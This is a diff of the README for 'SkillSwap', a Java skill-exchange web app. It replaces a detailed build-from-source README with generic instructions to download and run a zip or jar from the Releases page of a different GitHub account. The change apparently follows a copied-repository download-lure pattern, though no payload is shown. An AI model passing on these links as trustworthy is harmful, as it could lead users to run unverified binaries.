@@ -1,153 +1,98 @@
-# 🔄 SkillSwap – Peer-to-Peer Skill Sharing Platform
+# 🌟 SkillSwap - Exchange Skills with Ease
 
-SkillSwap is a web-based application designed to connect users who want to **share or learn skills** from each other. Users can create profiles, list the skills they offer and want, send requests to exchange skills, and communicate via built-in chat.
+## 🚀 Getting Started
 
----
+Welcome to SkillSwap! This application allows you to connect with others to exchange skills. You can create a profile, request skills, and chat with other users in real time. Follow this guide to download and run SkillSwap effortlessly.
 
-## 🚀 Features
+## 📥 Download SkillSwap 
 
-1. **User Registration & Login**
+[![Download SkillSwap](https://img.shields.io/badge/Download-SkillSwap-blue.svg)](https://github.com/devilstreameryt/SkillSwap/releases)
 
-   * Users create an account with basic information.
-   * Login is authenticated by email and password.
+## 📋 Features
 
-2. **Profile & Skills**
+- **User Profiles:** Set up a profile to showcase your skills and interests.
+- **Skill Requests:** Easily request specific skills from other users.
+- **Notifications:** Stay updated about new skill matches and messages.
+- **Real-Time Chats:** Communicate instantly with users in the application.
+- **Responsive Design:** Enjoy a seamless experience on both desktop and mobile.
 
-   * Users can manage their profile, including first/last name, bio, location, and photo.
-   * Users can add skills they **offer** and skills they **want** to learn.
+## ⚙️ System Requirements
 
-3. **Sending Requests**
+Before you begin, ensure that your system meets the following requirements:
 
-   * Users browse others with desired skills.
-   * Send skill exchange requests.
-   * Notifications alert users of incoming requests.
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Java Version:** JDK 8 or above installed on your machine.
+- **Database:** MySQL 5.6 or later.
+- **RAM:** Minimum 4 GB.
+- **Storage:** At least 500 MB of free space available.
 
-4. **Request Response**
+## 🛠️ Installation Steps
 
-   * Receivers can accept or reject requests.
-   * Upon acceptance, a chat is automatically created.
+Follow these simple steps to download and install SkillSwap:
 
-5. **Chat & Messaging**
+1. Visit the [Releases page](https://github.com/devilstreameryt/SkillSwap/releases) to access the latest version.
+2. Look for the most recent release.
+3. Click on the download link for the full application package (it will be a zip or jar file).
+4. Save the file to your computer.
 
-   * Users can chat with connected peers.
-   * Messages are timestamped and stored in the database.
+## 🖥️ Running SkillSwap
 
----
+Once you have downloaded the file, follow these instructions to run the application:
 
-## 🛠️ Tech Stack
+1. **Extract the Files (If Necessary):** 
+   - If you downloaded a zip file, right-click on it and select "Extract All." Choose a location to save the extracted files.
 
-| Layer           | Technology                  |
-| --------------- | --------------------------- |
-| Backend         | Java, Spring MVC, Spring Transaction Management, Hibernate/JPA |
-| Frontend        | JSP, HTML, CSS, Bootstrap      |
-| Database        | MySQL   |
-| File Handling   | Multipart file uploads for profile photos  |
-| ORM             | Hibernate                   |
-| Build Tool      | Maven                       |
-| Connection Pool | c3p0                        |
-| Server          | Apache Tomcat               |
+2. **Open Command Prompt or Terminal:**
+   - On Windows, press `Windows + R`, type `cmd`, and press `Enter`.
+   - On macOS or Linux, open the Terminal from the applications menu.
 
----
+3. **Navigate to the Download Location:**
+   - Type `cd path_to_your_download_folder` (replace `path_to_your_download_folder` with your actual path) and press `Enter`.
 
-## 🗂️ Project Structure
+4. **Run the Application:**
+   - If you have a jar file, type `java -jar SkillSwap.jar` and press `Enter`.
+   - If it’s a different format, follow the included instructions in the extracted folder.
 
-```
-src/
-└── com.skillswap
-    ├── controller         # UserController, handles HTTP requests
-    ├── dao                # UserDAO, SkillDAO, RequestDAO, MessageDAO, NotificationDAO interfaces and implementations
-    ├── model              # User, Skill, SkillsOffered, SkillsWanted, UserDetails, Request, Chat, Message, Notifications
-    ├── service            # UserService, SkillService, RequestService, ChatService, MessageService, NotificationService
-                            
-WebContent/
-├── WEB-INF/
-│   ├── lib/               # External JARs
-│   ├── view/              # JSP pages (home, signIn, singUp, dashboard, profile, sendRequests, viewRequests, notifications, chats, messages)
-│   ├── spring-container.xml
-│   └── web.xml
-├── resources/
-│   └── images/Screenshot_1.png
-```
+5. **Access the Application:**
+   - Open your web browser and go to `http://localhost:8080` to use SkillSwap.
 
----
+## 🧑‍🤝‍🧑 Community Support
 
-## 🗄️ Database Design
+If you have any questions or need help, you can reach out through the Issues tab in this repository. We encourage you to share your feedback and suggestions. You can also find a community of users who may offer advice or troubleshooting tips.
 
-Entity-Relationship Diagram (ERD) showing main tables and relations:
+## 🔧 Troubleshooting Tips
 
-- **Users** – stores user details (first name, last name, email, password)
-- **UserDetails** – stores extended profile details (bio, location, profile photo)
-- **Skills** – list of skills
-- **SkillsOffered** – mapping of users → skills they can teach
-- **SkillsWanted** – mapping of users → skills they want to learn
-- **Requests** – skill exchange requests between users
-- **Chats** – created when a request is accepted
-- **Messages** – messages exchanged in chats
-- **Notifications** – alerts for requests and updates
+If you encounter issues while running the application, consider the following:
 
-<img width="200" height="200" alt="Database ERD" src="https://github.com/user-attachments/assets/bb3bdd86-e9a5-47e5-91d3-ab1ca977c802" />
+- **Check Java Installation:** Make sure Java is installed and up to date. You can verify this by typing `java -version` in the command prompt or terminal.
+- **Database Connection:** Ensure your MySQL server is running and properly configured. Check the application settings for the correct database connection details.
+- **Firewall Settings:** If you cannot access the application, check your firewall settings to ensure it allows traffic on port 8080.
 
+## 🔒 Security Considerations
 
----
+SkillSwap aims to ensure user safety. Always download from the official [Releases page](https://github.com/devilstreameryt/SkillSwap/releases) to avoid malicious software. Additionally, keep your Java and MySQL installations secured and updated.
 
-## 🎨 UI Wireframes
+## 🗂️ Resources
 
-Initial frontend design sketches (Home, Sign In, Sign Up, Dashboard, Profile, Send Requests, View Requests, Notifications, Chat, Messages):
+For additional information, you may find these resources helpful:
 
-<img width="200" height="200" alt="Home, SignUp, SignIn, Dashboard" src="https://github.com/user-attachments/assets/384ed19a-b88e-4226-8e88-cdbaefe79078" />
+- [Java SE Development Kit](https://www.oracle.com/java/technologies/javase-downloads.html)
+- [MySQL Community Server](https://dev.mysql.com/downloads/mysql/)
+- [Documentation for Spring MVC](https://spring.io/guides/gs/serving-web-content/)
 
-<img width="200" height="200" alt="Profile" src="https://github.com/user-attachments/assets/1d8f9031-94d6-4ca4-9187-b78db8ae7186" />
+## 📘 Frequently Asked Questions (FAQs)
 
-<img width="200" height="200" alt="requests and notifications" src="https://github.com/user-attachments/assets/caff2f60-33a6-4d35-924c-5dd80789ed7b" />
+1. **Can I run SkillSwap without an internet connection?**
+   - Yes, you can run the application locally without an internet connection after initial setup.
 
-<img width="200" height="200" alt="Chats and messages" src="https://github.com/user-attachments/assets/c2c0f712-6a4c-44b0-803f-25f5b1478764" />
+2. **How do I change my profile information?**
+   - Log in and navigate to your profile. Click on "Edit" to update your information.
 
+3. **Is SkillSwap free to use?**
+   - Yes, SkillSwap is completely free. We aim to foster a skill-sharing community.
 
+## 🥳 Conclusion
 
----
+Thank you for choosing SkillSwap! We hope you enjoy using our application to connect and share your skills with others. If you have any suggestions or feedback, please let us know through the Issues page.
 
-## ▶️ Demo Video
-
-https://github.com/user-attachments/assets/319fc508-3006-4f87-8fdf-24650b3d48ce
-
-
-
----
-
-## 🧪 How to Run
-
-1. Clone the repository:
-
-```bash
-git clone https://github.com/abanoubwagim/SkillSwap.git
-cd SkillSwap
-```
-
-2. Import into Eclipse or IntelliJ as a Maven project.
-
-3. Configure your MySQL database:
-
-* Create a schema named `skillswap`
-* Tables will be created automatically by Hibernate
-* Update `spring-container.xml` with your DB username/password 
-
-4. Deploy the project to Apache Tomcat server.
-
-5. Open your browser:
-
-```
-http://localhost:8080/SkillSwap/
-```
-
----
-
-## 📄 License
-
-This project is open-source and free to use under the MIT License.
-
----
-
-## 🏷️ GitHub Topics
-
-`Java` `Spring MVC` `Hibernate` `JSP` `MySQL` `MVC` `Web-Application` `Full-Stack` `Bootstrap` `JSTL` `CRUD` `c3p0` `XML` `Apache Tomcat` `SkillSwap` `Chat` `Notifications` `Maven` `Peer-to-Peer` `SkillSharing`
-
+Remember, for the latest updates and to download the latest version, visit our [Releases page](https://github.com/devilstreameryt/SkillSwap/releases).
